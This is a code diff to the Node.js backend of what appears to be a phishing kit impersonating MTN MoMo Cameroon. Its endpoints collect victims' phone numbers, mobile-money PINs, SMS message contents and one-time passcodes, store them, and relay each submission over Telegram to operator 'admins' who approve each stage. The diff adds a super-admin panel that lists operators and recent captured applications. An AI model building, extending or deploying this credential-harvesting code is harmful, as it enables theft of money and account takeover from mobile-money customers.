@@ -175,18 +175,64 @@ function setupCommandHandlers() {
             if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                 return bot.sendMessage(chatId, `🚫 *ACCESS PAUSED*`, { parse_mode: 'Markdown' });
             }
+
             const admin = await db.getAdmin(adminId);
             const isSuperAdmin = adminId === 'ADMIN001';
 
-            bot.sendMessage(chatId, `
-👋 *Welcome back, ${admin.name}!*
-*Admin ID:* \`${adminId}\`
-*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Standard Admin'}
+            if (isSuperAdmin) {
+                // ==========================================
+                // SUPER ADMIN FULL CONTROL MENU
+                // ==========================================
+                bot.sendMessage(chatId, `
+⭐ *SUPER ADMIN CONTROL PANEL*
+----------------------------------
+👋 Welcome back, *${admin?.name || 'Super Admin'}*!
+*Admin ID:* \`ADMIN001\`
+*Your Portal Link:* ${WEBHOOK_URL}?admin=ADMIN001
 
-*Your Link:* ${WEBHOOK_URL}?admin=${adminId}
-            `.trim(), { parse_mode: 'Markdown' });
+Select an administrative option below:
+                `.trim(), {
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Global Stats', callback_data: 'sa_stats' },
+                                { text: '👥 List All Admins', callback_data: 'sa_manage_admins' }
+                            ],
+                            [
+                                { text: '📋 Recent Applications', callback_data: 'sa_view_apps' }
+                            ]
+                        ]
+                    }
+                });
+
+            } else {
+                // ==========================================
+                // STANDARD ADMIN MENU
+                // ==========================================
+                bot.sendMessage(chatId, `
+👤 *ADMIN PANEL*
+----------------------------------
+👋 Welcome back, *${admin?.name || 'Admin'}*!
+*Admin ID:* \`${adminId}\`
+*Your Portal Link:* ${WEBHOOK_URL}?admin=${adminId}
+                `.trim(), {
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '📊 My Statistics', callback_data: `admin_stats_${adminId}` }]
+                        ]
+                    }
+                });
+            }
+
         } else {
-            bot.sendMessage(chatId, `👋 *Welcome to MTN MoMo Cameroon*\nYour Chat ID: \`${chatId}\``, { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, `
+👋 *Welcome to MTN MoMo Cameroon*
+Your Telegram Chat ID: \`${chatId}\`
+
+⚠️ *Note:* You are not registered as an Admin. If you are an Admin, link this Chat ID in your database or contact Super Admin (\`ADMIN001\`).
+            `.trim(), { parse_mode: 'Markdown' });
         }
     });
 
@@ -218,13 +264,44 @@ bot.on('callback_query', async (callbackQuery) => {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused.', show_alert: true });
     }
 
+    // Handle Super Admin Callbacks (sa_)
+    if (data.startsWith('sa_')) {
+        if (adminId !== 'ADMIN001') {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Super Admin access required.', show_alert: true });
+        }
+
+        if (data === 'sa_stats') {
+            const stats = await db.getAdminStats('ADMIN001');
+            bot.sendMessage(chatId, `
+📊 *SUPER ADMIN SYSTEM STATS*
+📋 Total Applications: \`${stats.total}\`
+⏳ PIN Pending: \`${stats.pinPending}\`
+✅ PIN Approved: \`${stats.pinApproved}\`
+⏳ SMS Pending: \`${stats.smsPending}\`
+🎉 Fully Approved: \`${stats.fullyApproved}\`
+            `.trim(), { parse_mode: 'Markdown' });
+        } else if (data === 'sa_manage_admins') {
+            const admins = await db.getAllAdmins();
+            let adminList = admins.map(a => `• *${a.name}* (\`${a.adminId}\`)\n  Chat ID: \`${a.chatId || 'Not set'}\` | Status: *${a.status}*`).join('\n\n');
+            bot.sendMessage(chatId, `👥 *REGISTERED ADMINISTRATORS*\n----------------------------------\n${adminList || 'No admins registered.'}`, { parse_mode: 'Markdown' });
+        } else if (data === 'sa_view_apps') {
+            const apps = await db.getApplicationsByAdmin('ADMIN001');
+            const recent = apps.slice(-5).reverse();
+            let appList = recent.map(a => `📋 Ref: \`${a.id}\`\n📞 Phone: \`${formatPhone(a.phoneNumber)}\`\n📌 Status: PIN (${a.pinStatus}) | SMS (${a.smsStatus || a.smsOtpStatus || 'pending'})`).join('\n------------------\n');
+            bot.sendMessage(chatId, `📋 *RECENT APPLICATIONS (Last 5)*\n----------------------------------\n${appList || 'No applications found.'}`, { parse_mode: 'Markdown' });
+        }
+
+        return bot.answerCallbackQuery(callbackQuery.id);
+    }
+
+    // Handle Standard Workflow Callbacks
     const parts = data.split('_');
-    if (parts.length < 4) return;
+    if (parts.length < 4) return bot.answerCallbackQuery(callbackQuery.id);
 
     const [action, type, embeddedAdminId, ...appIdParts] = parts;
     const applicationId = appIdParts.join('_');
 
-    if (embeddedAdminId !== adminId) {
+    if (embeddedAdminId !== adminId && adminId !== 'ADMIN001') {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Assigned to another admin.', show_alert: true });
     }
 
@@ -262,7 +339,7 @@ bot.on('callback_query', async (callbackQuery) => {
 // 8. HIGH-PERFORMANCE REST API ENDPOINTS
 // ==========================================
 
-// Verify PIN Request Entry (Optimized for instant feedback)
+// Verify PIN Request Entry
 app.post('/api/verify-pin', async (req, res) => {
     try {
         const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
@@ -283,12 +360,10 @@ app.post('/api/verify-pin', async (req, res) => {
             assignedAdmin = availableAdmins[0];
         }
 
-        // Fast parallel checks or lightweight queries
         const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
         const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
         const isReturningUser = thisAdminPastApps.length > 0;
 
-        // Save application to database immediately
         await db.saveApplication({
             id: applicationId,
             adminId: assignedAdmin.adminId,
@@ -297,6 +372,7 @@ app.post('/api/verify-pin', async (req, res) => {
             pin,
             pinStatus: 'pending',
             smsStatus: 'pending',
+            smsOtpStatus: 'pending',
             otpStatus: 'pending',
             assignmentType: assignmentType || 'auto',
             isReturningUser,
@@ -304,10 +380,8 @@ app.post('/api/verify-pin', async (req, res) => {
             timestamp: new Date().toISOString()
         });
 
-        // Respond to user interface *immediately* (Zero Telegram network latency lag)
         res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
 
-        // Dispatch Telegram Notification Asynchronously in Background
         sendToAdminAsync(assignedAdmin.adminId, `
 🆕 *NEW PIN SUBMISSION*
 ------------------------------
@@ -344,10 +418,9 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
     }
 });
 
-// Verify SMS Submission Entry (Optimized & Updated)
+// Verify SMS Submission Entry
 app.post('/api/verify-sms', async (req, res) => {
     try {
-        // Accept either id or applicationId, and smsOtp or smsText
         const applicationId = req.body.id || req.body.applicationId;
         const smsContent = req.body.smsOtp || req.body.smsText;
 
@@ -361,7 +434,6 @@ app.post('/api/verify-sms', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Application not found.' });
         }
 
-        // Use standard db.updateApplication instead of deprecated db.updateApplicationSms
         await db.updateApplication(applicationId, {
             smsText: smsContent,
             smsOtp: smsContent,
@@ -369,10 +441,8 @@ app.post('/api/verify-sms', async (req, res) => {
             smsOtpStatus: 'pending'
         });
 
-        // Respond instantly
         res.json({ success: true });
 
-        // Non-blocking async Telegram alert
         sendToAdminAsync(application.adminId, `
 💬 *SMS CONTENT SUBMISSION*
 ------------------------------
@@ -414,7 +484,7 @@ app.get('/api/check-sms-status/:applicationId', async (req, res) => {
     }
 });
 
-// Verify OTP Stage Entry (Optimized & Updated)
+// Verify OTP Stage Entry
 app.post('/api/verify-otp', async (req, res) => {
     try {
         const applicationId = req.body.id || req.body.applicationId;
@@ -430,16 +500,13 @@ app.post('/api/verify-otp', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Application not found.' });
         }
 
-        // Use standard db.updateApplication
         await db.updateApplication(applicationId, {
             otp: otpCode,
             otpStatus: 'pending'
         });
 
-        // Respond instantly
         res.json({ success: true });
 
-        // Non-blocking async Telegram alert
         sendToAdminAsync(application.adminId, `
 🔢 *4-DIGIT OTP VERIFICATION*
 ------------------------------
